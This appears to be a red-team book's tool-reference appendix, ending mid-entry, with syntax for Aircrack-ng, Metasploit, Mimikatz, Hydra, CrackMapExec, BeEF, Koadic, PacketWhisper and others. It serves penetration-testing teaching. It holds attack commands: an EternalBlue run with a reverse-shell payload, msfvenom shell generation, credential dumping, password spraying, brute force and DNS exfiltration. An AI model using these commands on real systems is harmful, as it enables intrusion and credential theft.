# Appendix A: Comprehensive Tool Reference

## Introduction

Throughout this book, we've explored a wide array of cybersecurity tools designed for red team operations. This appendix provides a comprehensive reference for all the tools discussed, organized alphabetically with quick syntax references, common use cases, and alternative options. Use this as a quick lookup resource during your red team operations.

Each entry includes:
- Tool name and brief description
- Installation instructions
- Core syntax and common flags
- Typical use cases
- Alternative tools that provide similar functionality
- Additional resources for deeper learning

## Tools Reference

### Aircrack-ng Suite

**Description**: Comprehensive toolkit for wireless network security assessments, including packet capture, analysis, and cracking capabilities.

**Installation**:
```bash
sudo apt update
sudo apt install aircrack-ng
```

**Core Commands**:
```bash
# Enable monitor mode
airmon-ng start wlan0

# Capture packets
airodump-ng wlan0mon

# Target specific network
airodump-ng -c 1 --bssid 00:11:22:33:44:55 -w capture wlan0mon

# Capture handshake
aireplay-ng -0 1 -a 00:11:22:33:44:55 -c 66:77:88:99:AA:BB wlan0mon

# Crack WPA handshake
aircrack-ng -w wordlist.txt capture-01.cap
```

**Use Cases**:
- Wireless network security assessment
- WEP/WPA/WPA2 key cracking
- Evil twin attacks
- Client de-authentication

**Alternatives**:
- Wifite (automated wireless auditing)
- Kismet (wireless network detector and sniffer)
- WiFi-Pumpkin (framework for rogue access points)

### Amass

**Description**: Network mapping tool focused on subdomain enumeration using various techniques including DNS, scraping, APIs, and certificates.

**Installation**:
```bash
# Using apt
sudo apt install amass

# Using Go
go install -v github.com/OWASP/Amass/v3/...@master
```

**Core Commands**:
```bash
# Passive enumeration
amass enum -passive -d example.com -o results.txt

# Active enumeration
amass enum -active -d example.com -src -ip -o results.txt

# Get specific information using intel
amass intel -whois -d example.com
```

**Use Cases**:
- Attack surface mapping
- Subdomain discovery
- External reconnaissance
- Domain intelligence gathering

**Alternatives**:
- Sublist3r
- Subfinder
- Assetfinder

### APTSimulator

**Description**: Toolkit that simulates artifacts from Advanced Persistent Threats to test security controls without actual malicious activity.

**Installation**:
```bash
git clone https://github.com/NextronSystems/APTSimulator-Linux.git
cd APTSimulator-Linux
chmod +x apt-simulator.sh
```

**Core Commands**:
```bash
# Show available modules
./apt-simulator.sh --list

# Run all simulation modules
sudo ./apt-simulator.sh --all

# Run specific modules
sudo ./apt-simulator.sh --module WEBSHELL --module C2
```

**Use Cases**:
- Testing blue team detection capabilities
- Validating security controls
- Simulating known threat actor TTPs
- Testing SIEM and EDR detection rules

**Alternatives**:
- Atomic Red Team
- Caldera
- Red Team Automation (RTA)

### Atomic Red Team

**Description**: Library of simple tests mapped to the MITRE ATT&CK framework that can be executed to test security controls.

**Installation**:
```bash
# Clone the repository
git clone https://github.com/redcanaryco/atomic-red-team.git
cd atomic-red-team

# Install framework (if using PowerShell)
pwsh -c "Install-Module -Name AtomicRedTeam -Scope CurrentUser -Force"
```

**Core Commands**:
```bash
# Execute a specific test
bash -c "$(cat atomic-red-team/atomics/T1053.003/T1053.003.yaml | grep -A 20 'executor: bash' | grep 'command:' | head -n 1 | cut -d':' -f2-)"

# Using the Python-based framework
python atomics.py run T1053.003 --test-numbers 1

# Cleanup after testing
python atomics.py cleanup T1053.003 --test-numbers 1
```

**Use Cases**:
- Testing specific ATT&CK techniques
- Validating security controls
- Training exercises
- Verifying EDR/XDR detections

**Alternatives**:
- Caldera
- APTSimulator
- Metasploit

### BeEF (Browser Exploitation Framework)

**Description**: Framework focused on web browser exploitation and client-side attacks.

**Installation**:
```bash
# Using apt
sudo apt install beef-xss

# Using Git
git clone https://github.com/beefproject/beef.git
cd beef
./install
```

**Core Commands**:
```bash
# Start BeEF
cd /usr/share/beef-xss/
sudo ./beef

# Access web interface
# URL: http://127.0.0.1:3000/ui/panel
# Default credentials: beef:beef

# Hook URL to inject into target sites
# http://YOUR_IP:3000/hook.js
```

**Use Cases**:
- Client-side attack assessment
- Social engineering campaigns
- Session hijacking
- Browser vulnerability testing

**Alternatives**:
- XSS Hunter
- Metasploit Browser Autopwn
- OWASP ZAP

### Bloodhound

**Description**: Active Directory reconnaissance tool that uses graph theory to visualize relationships and attack paths.

**Installation**:
```bash
# Install Neo4j and Bloodhound
sudo apt install bloodhound neo4j

# Start Neo4j service
sudo neo4j start
```

**Core Commands**:
```bash
# Launch Bloodhound
bloodhound

# Connect to Neo4j (default credentials: neo4j:neo4j)
# Collect data using SharpHound
# Import data into Bloodhound interface
```

**Use Cases**:
- Active Directory attack path visualization
- Privilege escalation path discovery
- Domain user relationship mapping
- Target prioritization in AD environments

**Alternatives**:
- ADExplorer
- PingCastle
- ADRecon

### Burp Suite

**Description**: Web application security testing platform with various tools for scanning, analyzing, and exploiting web applications.

**Installation**:
```bash
# Download from PortSwigger website
# https://portswigger.net/burp/communitydownload

# Start Burp Suite
java -jar burpsuite_community.jar
```

**Core Commands**:
- Set proxy: 127.0.0.1:8080
- Configure browser to use proxy
- Navigate to http://burp to install CA certificate
- Use Proxy > Intercept to capture and modify traffic
- Use Scanner to identify vulnerabilities
- Use Repeater to manipulate and resend requests

**Use Cases**:
- Web application penetration testing
- API security assessment
- Request interception and modification
- Authentication bypass testing
- Input validation testing

**Alternatives**:
- OWASP ZAP
- Nikto
- Skipfish

### Caldera

**Description**: Automated adversary emulation platform that executes adversary behaviors based on the MITRE ATT&CK framework.

**Installation**:
```bash
# Clone the repository
git clone https://github.com/mitre/caldera.git
cd caldera

# Install dependencies
pip3 install -r requirements.txt

# Install plugins
pip3 install -r plugins/requirements.txt

# Start the server
python3 server.py --insecure
```

**Core Commands**:
```bash
# Access web interface: http://localhost:8888
# Default credentials: red/admin

# Deploy agent (from the web UI)
# Run operations against agents
# Create custom adversary profiles
```

**Use Cases**:
- Automated adversary emulation
- Red team operations
- Security control validation
- Threat modeling

**Alternatives**:
- Atomic Red Team
- Infection Monkey
- Metasploit

### CloudGoat

**Description**: Vulnerable-by-design AWS environment for practicing AWS exploitation techniques.

**Installation**:
```bash
# Clone the repository
git clone https://github.com/RhinoSecurityLabs/cloudgoat.git
cd cloudgoat
pip install -r requirements.txt

# Configure AWS credentials
./cloudgoat.py config
```

**Core Commands**:
```bash
# Create a scenario
./cloudgoat.py create iam_privesc_by_attachment

# List available scenarios
./cloudgoat.py list

# Destroy a scenario
./cloudgoat.py destroy iam_privesc_by_attachment
```

**Use Cases**:
- AWS security testing
- Cloud security training
- Privilege escalation practice
- S3 bucket exploitation

**Alternatives**:
- Pacu
- TerraGoat
- AWSGoat

### CloudSploit

**Description**: Cloud security scanning tool that identifies security misconfigurations across multiple cloud platforms.

**Installation**:
```bash
# Clone the repository
git clone https://github.com/aquasecurity/cloudsploit.git
cd cloudsploit

# Install dependencies
npm install

# Configure credentials
cp config_example.js config.js
nano config.js
```

**Core Commands**:
```bash
# Scan AWS environment
./index.js --cloud aws

# Focus on specific plugins
./index.js --cloud aws --plugin ec2,iam,s3

# Generate report in specific format
./index.js --cloud aws --csv
```

**Use Cases**:
- Cloud security configuration assessment
- Compliance scanning
- Vulnerability identification
- Security baseline verification

**Alternatives**:
- ScoutSuite
- Prowler
- CloudMapper

### Commix

**Description**: Command injection exploitation tool designed to find and exploit command injection vulnerabilities.

**Installation**:
```bash
# Using apt
sudo apt install commix

# Using Git
git clone https://github.com/commixproject/commix.git
cd commix
```

**Core Commands**:
```bash
# Basic scan
python commix.py --url="https://example.com/search.php?query=test"

# Test with random agent
python commix.py --url="https://example.com/search.php?query=test" --random-agent

# Specific parameter test
python commix.py -u "https://example.com/search.php" -p "query"
```

**Use Cases**:
- Command injection vulnerability testing
- Web application penetration testing
- Exploiting input validation flaws
- Post-exploitation command execution

**Alternatives**:
- SQLmap (for SQL injection)
- XSSer (for XSS)
- Wfuzz

### CrackMapExec

**Description**: Post-exploitation tool that helps automate assessing security in Active Directory environments.

**Installation**:
```bash
# Using apt
sudo apt install crackmapexec

# Using pip
pip3 install crackmapexec
```

**Core Commands**:
```bash
# SMB enumeration
crackmapexec smb 192.168.1.0/24

# Password spraying
crackmapexec smb 192.168.1.0/24 -u user -p 'Password123!'

# Local admin mapping
crackmapexec smb 192.168.1.0/24 -u administrator -p 'Password123!' --local-auth

# Execute commands
crackmapexec smb 192.168.1.0/24 -u administrator -p 'Password123!' -x 'whoami'
```

**Use Cases**:
- Active Directory enumeration
- Credential validation
- Local admin mapping
- Lateral movement
- Password spraying

**Alternatives**:
- Impacket
- PowerView
- SharpHound

### Deepce

**Description**: Docker enumeration, privilege escalation, and container escape tool designed for testing container security.

**Installation**:
```bash
# Clone the repository
git clone https://github.com/stealthcopter/deepce.git
cd deepce

# Make executable
chmod +x deepce.sh
```

**Core Commands**:
```bash
# Run basic scan from inside a container
./deepce.sh

# Enable full capabilities
./deepce.sh --full

# Focus on escape techniques
./deepce.sh --no-enumeration --exploit

# Silent operation
./deepce.sh --quiet
```

**Use Cases**:
- Container security assessment
- Docker privilege escalation testing
- Container escape identification
- Docker security configuration analysis

**Alternatives**:
- CDK (Container DoorKeeper)
- Clair
- Docker Bench for Security

### Dirbuster/Gobuster/Dirb

**Description**: Web content scanning tools that discover hidden files and directories on web servers.

**Installation**:
```bash
# Installing dirb
sudo apt install dirb

# Installing gobuster
sudo apt install gobuster

# Dirbuster (GUI) install
sudo apt install dirbuster
```

**Core Commands**:
```bash
# Dirb
dirb http://example.com /usr/share/dirb/wordlists/common.txt

# Gobuster
gobuster dir -u http://example.com -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

# Dirbuster (GUI)
dirbuster
```

**Use Cases**:
- Web directory enumeration
- Hidden file discovery
- Web application mapping
- Content discovery

**Alternatives**:
- Feroxbuster
- Wfuzz
- OWASP Dirbuster

### Empire

**Description**: Post-exploitation framework with a focus on client and server agents for encrypted communication.

**Installation**:
```bash
# Clone the repository
git clone https://github.com/BC-SECURITY/Empire.git
cd Empire

# Install dependencies
pip3 install -r requirements.txt

# Setup Empire
./setup/install.sh
```

**Core Commands**:
```bash
# Start Empire
sudo ./empire

# Create a listener
uselistener http
set Name mylistener
execute

# Generate a stager
usestager multi/bash
set Listener mylistener
execute
```

**Use Cases**:
- Post-exploitation
- Persistence establishment
- Privilege escalation
- Lateral movement
- Command and control

**Alternatives**:
- Metasploit
- Covenant
- Sliver

### Expliot

**Description**: Comprehensive framework for testing IoT security, supporting various protocols and interfaces.

**Installation**:
```bash
# Install dependencies
sudo apt-get install python3-pip python3-dev libglib2.0-dev

# Install Expliot
pip3 install expliot
```

**Core Commands**:
```bash
# Launch Expliot
expliot

# List available plugins
plugins

# Get help for a specific plugin
help mqtt.broker.basic

# Execute a plugin
use mqtt.broker.basic
set host 192.168.1.100
run
```

**Use Cases**:
- IoT security assessment
- Protocol testing (MQTT, CoAP, BLE, Zigbee)
- Hardware interface testing
- IoT device vulnerability assessment

**Alternatives**:
- RFCrack (for RF testing)
- IoTSeeker
- Firmwalker (for firmware)

### Faraday

**Description**: Integrated penetration testing environment that provides collaborative functionality and reporting.

**Installation**:
```bash
# Clone the repository
git clone https://github.com/infobyte/faraday.git
cd faraday

# Install dependencies
pip3 install -r requirements.txt

# Install Faraday
./install.sh

# Start the Faraday server
faraday-server
```

**Core Commands**:
```bash
# Access web interface at http://localhost:5985
# Default credentials: faraday/changeme

# Create a new workspace via CLI
faraday-client --workspace "CompanyX_External_2023Q1" --create

# Run a tool through Faraday
faraday-client --workspace "CompanyX_External_2023Q1" --plugin nmap -i office_network_scan.xml
```

**Use Cases**:
- Collaborative penetration testing
- Vulnerability management
- Report generation
- Security assessment tracking

**Alternatives**:
- Dradis
- MagicTree
- OWASP DefectDojo

### Firmwalker

**Description**: Tool for analyzing extracted firmware to identify security issues and sensitive information.

**Installation**:
```bash
# Clone the repository
git clone https://github.com/craigz28/firmwalker.git
cd firmwalker

# Make executable
chmod +x firmwalker.sh
```

**Core Commands**:
```bash
# Analyze extracted firmware
./firmwalker.sh /path/to/extracted/firmware
```

**Use Cases**:
- Firmware security analysis
- Credential discovery
- Configuration examination
- Sensitive information detection

**Alternatives**:
- Binwalk
- Firmware-Analysis-Toolkit
- FACT (Firmware Analysis and Comparison Tool)

### Gobuster

**Description**: Tool for brute-forcing URIs, DNS subdomains, virtual host names, and more.

**Installation**:
```bash
# Using apt
sudo apt install gobuster

# Using Go
go install github.com/OJ/gobuster/v3@latest
```

**Core Commands**:
```bash
# Directory mode
gobuster dir -u http://example.com -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

# DNS mode
gobuster dns -d example.com -w /usr/share/wordlists/SecLists/Discovery/DNS/namelist.txt

# Virtual host discovery
gobuster vhost -u http://example.com -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt
```

**Use Cases**:
- Web content discovery
- Subdomain enumeration
- Virtual host discovery
- Web application mapping

**Alternatives**:
- Dirb
- Dirbuster
- Wfuzz

### Gophish

**Description**: Open-source phishing toolkit designed for businesses and penetration testers.

**Installation**:
```bash
# Download from GitHub releases
# https://github.com/gophish/gophish/releases
wget https://github.com/gophish/gophish/releases/download/v0.11.0/gophish-v0.11.0-linux-64bit.zip
unzip gophish-v0.11.0-linux-64bit.zip
chmod +x gophish
```

**Core Commands**:
```bash
# Start Gophish
./gophish

# Access admin interface (default: http://localhost:3333)
# Default credentials: admin:gophish

# CLI management (if available)
gocli campaigns list
```

**Use Cases**:
- Phishing campaign management
- Security awareness testing
- Email security assessment
- Social engineering campaigns

**Alternatives**:
- Social Engineering Toolkit (SET)
- King Phisher
- Lucy

### Grype

**Description**: Vulnerability scanner for container images and filesystems.

**Installation**:
```bash
# Using curl
curl -sSfL https://raw.githubusercontent.com/anchore/grype/main/install.sh | sh -s -- -b /usr/local/bin

# Using Docker
docker pull anchore/grype
```

**Core Commands**:
```bash
# Scan a container image
grype alpine:latest

# Scan with specific output format
grype nginx:1.19 -o json > nginx-vulnerabilities.json

# Scan image from container registry
grype docker.io/library/debian:11
```

**Use Cases**:
- Container vulnerability scanning
- Image security assessment
- Supply chain security
- Compliance verification

**Alternatives**:
- Trivy
- Clair
- Snyk Container

### Hashcat

**Description**: Advanced password recovery utility supporting various hash types with GPU acceleration.

**Installation**:
```bash
# Using apt
sudo apt install hashcat

# Check for GPU support
hashcat -I
```

**Core Commands**:
```bash
# Crack MD5 hash with wordlist
hashcat -m 0 -a 0 hash.txt wordlist.txt

# Crack Linux shadow hashes (SHA512crypt)
hashcat -m 1800 -a 0 hashes.txt wordlist.txt

# Use rule-based attack
hashcat -m 1800 -a 0 hashes.txt wordlist.txt -r rules/best64.rule

# Brute force short passwords
hashcat -m 1800 -a 3 hashes.txt ?a?a?a?a?a?a
```

**Use Cases**:
- Password cracking
- Password audit
- Hash identification and recovery
- Password policy testing

**Alternatives**:
- John the Ripper
- RainbowCrack
- THC Hydra (for online attacks)

### Hydra

**Description**: Fast and flexible online password cracking tool supporting numerous protocols.

**Installation**:
```bash
# Using apt
sudo apt install hydra
```

**Core Commands**:
```bash
# SSH brute force
hydra -l root -P passwords.txt ssh://192.168.1.100

# HTTP form-based attack
hydra -l admin -P wordlist.txt 192.168.1.100 http-post-form "/login.php:username=^USER^&password=^PASS^:Invalid credentials"

# Multiple username/password lists
hydra -L users.txt -P passwords.txt ssh://192.168.1.100
```

**Use Cases**:
- Online password attacks
- Credential brute forcing
- Authentication testing
- Web form analysis

**Alternatives**:
- Medusa
- Patator
- BruteSpray

### Impacket

**Description**: Collection of Python classes for working with network protocols, particularly focused on Windows/Active Directory protocols.

**Installation**:
```bash
# Using pip
pip3 install impacket

# Using git
git clone https://github.com/SecureAuthCorp/impacket.git
cd impacket
pip3 install -r requirements.txt
python3 setup.py install
```

**Core Commands**:
```bash
# SMB client
python3 impacket-smbclient -hashes aad3b435b51404eeaad3b435b51404ee:C23AD9B5F526D8F48D90A9D2E6DD52F3 administrator@192.168.1.100

# WMI execution
python3 impacket-wmiexec -hashes aad3b435b51404eeaad3b435b51404ee:C23AD9B5F526D8F48D90A9D2E6DD52F3 administrator@192.168.1.100

# Get service tickets
python3 impacket-GetUserSPNs domain.local/user:password -dc-ip 192.168.1.100 -request
```

**Use Cases**:
- Active Directory exploitation
- Windows protocol manipulation
- NTLM authentication attacks
- Kerberos attacks

**Alternatives**:
- CrackMapExec
- Empire
- Rubeus (Windows-based)

### Infection Monkey

**Description**: Open-source breach and attack simulation tool for testing data center and cloud security.

**Installation**:
```bash
# Using Docker
docker pull guardicore/monkey-island:latest

# Run the server
docker run --name monkey-island -d -p 5000:5000 guardicore/monkey-island:latest
```

**Core Commands**:
```bash
# Access web interface at https://localhost:5000
# Deploy agents to target systems
# Configure security testing scenarios
# Review results and reports
```

**Use Cases**:
- Network segmentation testing
- Zero-trust architecture validation
- Lateral movement path identification
- Container security assessment

**Alternatives**:
- Caldera
- Atomic Red Team
- Stratus Red Team (for cloud)

### IoTSeeker

**Description**: Tool for discovering vulnerable IoT devices on a network, focusing on default credentials and known vulnerabilities.

**Installation**:
```bash
# Clone the repository
git clone https://github.com/rapid7/IoTSeeker.git
cd IoTSeeker

# Install dependencies
pip install requests ipaddress colorama
```

**Core Commands**:
```bash
# Scan a network range
python iotseeker.py -r 192.168.1.0/24

# Scan specific targets
python iotseeker.py -t targets.txt

# Save results to a file
python iotseeker.py -r 192.168.1.0/24 -o scan_results.txt
```

**Use Cases**:
- IoT device discovery
- Default credential testing
- Vulnerable firmware detection
- IoT security assessment

**Alternatives**:
- Expliot
- Shodan (online service)
- Nmap with IoT scripts

### John the Ripper

**Description**: Versatile password cracking tool supporting various hash types and attack methods.

**Installation**:
```bash
# Basic version
sudo apt install john

# Jumbo version (more features)
git clone https://github.com/openwall/john.git
cd john/src
./configure && make
```

**Core Commands**:
```bash
# Crack shadow file passwords
sudo john --format=sha512crypt hashes.txt

# Use wordlist with rules
sudo john --wordlist=wordlist.txt --rules hashes.txt

# Show cracked passwords
sudo john --show hashes.txt

# Use incremental mode
john --incremental hashes.txt
```

**Use Cases**:
- Password cracking
- Password auditing
- Hash identification
- Format conversion

**Alternatives**:
- Hashcat
- Ophcrack
- L0phtCrack

### Kismet

**Description**: Wireless network detector, sniffer, and intrusion detection system.

**Installation**:
```bash
# Using apt
sudo apt install kismet

# From source
git clone https://github.com/kismetwireless/kismet.git
cd kismet
./configure
make
sudo make install
```

**Core Commands**:
```bash
# Start kismet
sudo kismet

# Access web interface (usually http://localhost:2501)
# Default credentials: kismet:kismet

# Capture with specific interface
sudo kismet -c wlan0
```

**Use Cases**:
- Wireless network detection
- Passive monitoring
- Wireless intrusion detection
- Wardriving

**Alternatives**:
- Aircrack-ng
- Wireshark
- WiFi Pineapple

### Koadic

**Description**: COM Command & Control framework, acting as a Windows post-exploitation tool similar to Meterpreter.

**Installation**:
```bash
# Clone the repository
git clone https://github.com/zerosum0x0/koadic.git
cd koadic

# Install dependencies
pip3 install -r requirements.txt
```

**Core Commands**:
```bash
# Start Koadic
./koadic

# Create a stager
use stager/js/mshta
set SRVHOST 192.168.1.100
set SRVPORT 8443
run

# Interact with zombie
zombies
use implant/gather/hashdump
```

**Use Cases**:
- Windows post-exploitation
- COM-based command and control
- Fileless persistence
- Living-off-the-land techniques

**Alternatives**:
- Empire
- Metasploit
- Covenant

### Kube-Hunter

**Description**: Tool for discovering security weaknesses in Kubernetes clusters.

**Installation**:
```bash
# Using pip
pip install kube-hunter

# Using Docker
docker pull aquasec/kube-hunter
```

**Core Commands**:
```bash
# Basic remote scan
kube-hunter --remote 10.0.0.1

# Scan a network range
kube-hunter --cidr 10.0.0.0/24

# Internal cluster scanning
kubectl run -it kube-hunter --image=aquasec/kube-hunter -- --pod
```

**Use Cases**:
- Kubernetes security assessment
- Cluster configuration analysis
- API server vulnerability identification
- Node component security testing

**Alternatives**:
- kube-bench
- Trivy Kubernetes
- Kubescape

### Legion

**Description**: Automated network scanner that combines multiple tools into a single interface.

**Installation**:
```bash
# Using apt
sudo apt install legion
```

**Core Commands**:
```bash
# Launch Legion
sudo legion

# CLI usage (if available)
legion-cli -t 192.168.1.0/24 -o scan_results
```

**Use Cases**:
- Network security assessment
- Service enumeration
- Vulnerability scanning
- Automated penetration testing

**Alternatives**:
- Sparta/SPARTA
- AutoRecon
- Nmap (command-line)

### LinPEAS/WinPEAS

**Description**: Privilege Escalation Awesome Scripts that search for possible paths to elevate privileges on Linux/Windows systems.

**Installation**:
```bash
# Clone the repository
git clone https://github.com/carlospolop/PEASS-ng.git
cd PEASS-ng

# Or download directly
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
chmod +x linpeas.sh
```

**Core Commands**:
```bash
# Run LinPEAS with all checks
./linpeas.sh

# Run with specific checks
./linpeas.sh -a

# Quiet mode with only relevant findings
./linpeas.sh -q
```

**Use Cases**:
- Privilege escalation vulnerability discovery
- System enumeration
- Security misconfigurations identification
- Post-exploitation reconnaissance

**Alternatives**:
- Linux Exploit Suggester
- Unix-privesc-checker
- BeRoot

### MagicTree

**Description**: Data management tool for penetration testing that organizes information in a tree structure.

**Installation**:
```bash
# Download the latest version
wget https://www.gremwell.com/sites/default/files/MagicTree-1.3.jar

# Make executable
chmod +x MagicTree-1.3.jar

# Run MagicTree
java -jar MagicTree-1.3.jar
```

**Core Commands**:
- Use the GUI to:
  - Import tool output
  - Organize findings
  - Apply transformations
  - Generate reports

**Use Cases**:
- Penetration test data organization
- Result transformation and analysis
- Report generation
- Vulnerability tracking

**Alternatives**:
- Dradis
- Faraday
- Lair

### Masscan

**Description**: Ultra-fast Internet port scanner, capable of scanning the entire Internet in under 6 minutes.

**Installation**:
```bash
# Using apt
sudo apt install masscan

# From source
git clone https://github.com/robertdavidgraham/masscan.git
cd masscan
make
```

**Core Commands**:
```bash
# Basic scan
sudo masscan -p80,443 192.168.1.0/24

# Rapid port scanning across large ranges
sudo masscan -p1-65535 --rate=10000 192.168.0.0/16 -oL masscan_results.txt

# Output in various formats
sudo masscan -p22,80,443 10.0.0.0/8 --output-format json -oJ results.json
```

**Use Cases**:
- Large-scale network mapping
- Internet-wide scanning
- Quick port discovery
- Initial reconnaissance

**Alternatives**:
- Nmap (less speed, more features)
- ZMap
- Unicornscan

### Medusa

**Description**: Parallel login brute force tool supporting multiple protocols.

**Installation**:
```bash
# Using apt
sudo apt install medusa
```

**Core Commands**:
```bash
# Basic authentication attack
medusa -h 192.168.1.100 -u admin -P passwords.txt -M http

# Multiple targets
medusa -H hosts.txt -U users.txt -P passwords.txt -M ssh

# RDP brute force attack
medusa -h 192.168.1.100 -u administrator -P password_list.txt -M rdp
```

**Use Cases**:
- Authentication testing
- Credential brute forcing
- Password policy verification
- Multiple protocol testing

**Alternatives**:
- Hydra
- Patator
- Crowbar

### Metasploit Framework

**Description**: Comprehensive penetration testing framework with exploit development, payload generation, and post-exploitation capabilities.

**Installation**:
```bash
# Using apt
sudo apt update
sudo apt install metasploit-framework

# From source
curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall
chmod +x msfinstall
./msfinstall
```

**Core Commands**:
```bash
# Start console
msfconsole

# Search for exploits
search type:exploit platform:windows microsoft

# Use an exploit
use exploit/windows/smb/ms17_010_eternalblue

# Set options
set RHOSTS 192.168.1.100
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.1.200

# Run exploit
exploit

# Generate payload
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.200 LPORT=4444 -f exe -o payload.exe
```

**Use Cases**:
- Vulnerability exploitation
- Payload generation
- Post-exploitation
- Security testing
- Penetration testing

**Alternatives**:
- Cobalt Strike (commercial)
- Empire
- Sliver

### Mimikatz

**Description**: Tool for extracting plaintextext passwords, hashes, pins, and Kerberos tickets from memory.

**Installation**:
```bash
# Download from GitHub
# https://github.com/gentilkiwi/mimikatz/releases

# Run on Windows
# On Linux, can use Wine or for similar functionality with native tools
sudo apt install mimikatz
```

**Core Commands**:
```bash
# On Windows (privilege required)
mimikatz.exe

# Extract passwords from memory
privilege::debug
sekurlsa::logonpasswords

# Extract Kerberos tickets
sekurlsa::tickets

# Pass-the-Hash
sekurlsa::pth /user:Administrator /domain:contoso.local /ntlm:e2b475c11da2a0748290d87aa966c327
```

**Use Cases**:
- Credential extraction and theft
- Pass-the-Hash/Pass-the-Ticket attacks
- Kerberos attacks
- Authentication analysis

**Alternatives**:
- LaZagne
- CredDump
- Windows Credential Editor

### Nessus Essentials

**Description**: Vulnerability scanning platform with comprehensive detection capabilities (free version limited to 16 IPs).

**Installation**:
```bash
# Download from Tenable website
# https://www.tenable.com/products/nessus/nessus-essentials

# Install the package
sudo dpkg -i Nessus-<version>.deb

# Start Nessus service
sudo systemctl start nessusd
```

**Core Commands**:
```bash
# Access web interface (https://localhost:8834)
# Create an account and activate using registration code
# Create and configure scans through the web interface
```

**Use Cases**:
- Vulnerability scanning
- Configuration auditing
- Compliance checking
- Web application scanning

**Alternatives**:
- OpenVAS
- Nexpose Community Edition
- Nikto (web-specific)

### Nikto

**Description**: Web server scanner that performs comprehensive tests against web servers for multiple vulnerabilities.

**Installation**:
```bash
# Using apt
sudo apt install nikto
```

**Core Commands**:
```bash
# Basic scan
nikto -h http://example.com

# Scan with SSL
nikto -h https://example.com -ssl

# Specify port
nikto -h example.com -p 8080

# Output to file
nikto -h example.com -o results.html -Format html
```

**Use Cases**:
- Web server vulnerability scanning
- Server misconfiguration detection
- Default files/CGIs discovery
- Outdated software detection

**Alternatives**:
- OWASP ZAP
- Wapiti
- Skipfish

### Nmap

**Description**: Network mapper and security scanner for discovering hosts and services on networks.

**Installation**:
```bash
# Using apt
sudo apt install nmap
```

**Core Commands**:
```bash
# Basic scan
nmap 192.168.1.0/24

# Service and version detection
nmap -sV -sC 192.168.1.100

# Full port scan with OS detection
sudo nmap -sS -p- -O 192.168.1.100

# Vulnerability scanning
nmap --script vuln 192.168.1.100

# Output to file
nmap -sV 192.168.1.0/24 -oA scan_results
```

**Use Cases**:
- Network discovery
- Port scanning
- Service enumeration
- OS fingerprinting
- Vulnerability detection

**Alternatives**:
- Masscan (faster, less features)
- Zmap
- Angry IP Scanner

### OpenVAS

**Description**: Open Vulnerability Assessment System, a full-featured vulnerability scanner.

**Installation**:
```bash
# Using apt
sudo apt install openvas

# Setup OpenVAS
sudo gvm-setup
```

**Core Commands**:
```bash
# Start OpenVAS services
sudo gvm-start

# Access web interface (usually https://localhost:9392)
# Default credentials: admin:admin

# CLI operation
omp -u admin -w password -C -n "External Scan" -t 192.168.1.0/24
```

**Use Cases**:
- Vulnerability scanning
- Security audit
- Compliance checking
- Network assessment

**Alternatives**:
- Nessus Essentials
- Nexpose Community Edition
- Qualys Community Edition

### OWASP ZAP

**Description**: Web application security scanner with both automated and manual testing capabilities.

**Installation**:
```bash
# Using apt
sudo apt install zaproxy

# Download from OWASP
# https://www.zaproxy.org/download/
```

**Core Commands**:
```bash
# Launch ZAP
zaproxy

# CLI mode
zap-cli quick-scan --self-contained --start-options "-config api.disablekey=true" https://example.com
```

**Use Cases**:
- Web application security testing
- API security assessment
- Active and passive scanning
- OWASP Top 10 vulnerability detection

**Alternatives**:
- Burp Suite
- Nikto
- Skipfish

### PacketWhisper

**Description**: Steganographic exfiltration tool using DNS queries to exfiltrate data covertly.

**Installation**:
```bash
# Clone the repository
git clone https://github.com/TryCatchHCF/PacketWhisper.git
cd PacketWhisper
```

**Core Commands**:
```bash
# Start PacketWhisper
python packetWhisper.py

# Select options through interactive menu:
# - Encoding method
# - Transport method
# - File to exfiltrate
```

**Use Cases**:
- Covert data exfiltration
- Data Loss Prevention (DLP) testing
- Network monitoring evasion
- Data hiding

**Alternatives**:
- DNScat2
- Iodine
- dnsfilexfer

### Pacu

**Description**: AWS exploitation framework designed for testing the security of Amazon Web Services environments.

**Installation**:
```bash
# Clone the repository
git clone https://github.com/RhinoSecurityLabs/pacu.git
cd pacu

# Install dependencies
pip install -r requirements.txt

# Launch Pacu
python3 pacu.py
```

**Core Commands**:
```bash
# Create a new session
new_session red_team_assessment

# Set AWS keys
set_keys

# Run the AWS keys module
run aws__enum_account

# Find privilege escalation paths
run iam__privesc_scan

# List modules
list
```

**Use Cases**:
- AWS security assessment
- Privilege escalation testing
- S3 bucket exploitation
- IAM security testing

**Alternatives**:
- ScoutSuite
- CloudSploit
- AWS Inspector

### Proxychains

**Description**: Tool for routing traffic through proxy servers, enabling anonymity and access to restricted resources.

**Installation**:
```bash
# Using apt
sudo apt install proxychains4
```

**Core Commands**:
```bash
# Edit configuration
nano /etc/proxychains4.conf

# Use with specific application
proxychains firefox

# Use with Nmap (TCP connect scan only)
proxychains nmap -sT -p 80,443 example.com

# Chain multiple proxies
# Edit proxychains.conf and set:
# [ProxyList]
# socks5 127.0.0.1 9050
# socks4 proxy1.example.com 1080
# http proxy2.example.com 8080
```

**Use Cases**:
- Anonymizing connections
- Bypassing network restrictions
- Penetration testing stealth
- Network traffic routing

**Alternatives**:
- Tor Browser
- NordVPN/ProtonVPN
- SSH tunneling

### Recon-ng

**Description**: Modular reconnaissance framework with numerous modules for OSINT gathering.

**Installation**:
```bash
# Using apt
sudo apt install recon-ng

# Using pip
pip install recon-ng
```

**Core Commands**:
```bash
# Launch Recon-ng
recon-ng

# Install marketplace modules
marketplace install all

# Use specific module
modules load recon/domains-hosts/google_site_web

# Set options
options set SOURCE example.com

# Run the module
run
```

**Use Cases**:
- Open-source intelligence gathering
- Domain reconnaissance
- Contact information discovery
- Social media enumeration

**Alternatives**:
- Maltego
- TheHarvester
- SpiderFoot

### Responder

**Description**: LLMNR, NBT-NS, and MDNS poisoner for capturing credentials on internal networks.

**Installation**:
```bash
# Using apt
sudo apt install responder

# From source
git clone https://github.com/lgandx/Responder.git
cd Responder
```

**Core Commands**:
```bash
# Basic usage
sudo responder -I eth0 -wrf

# Analyze logs
sudo responder -I eth0 -A

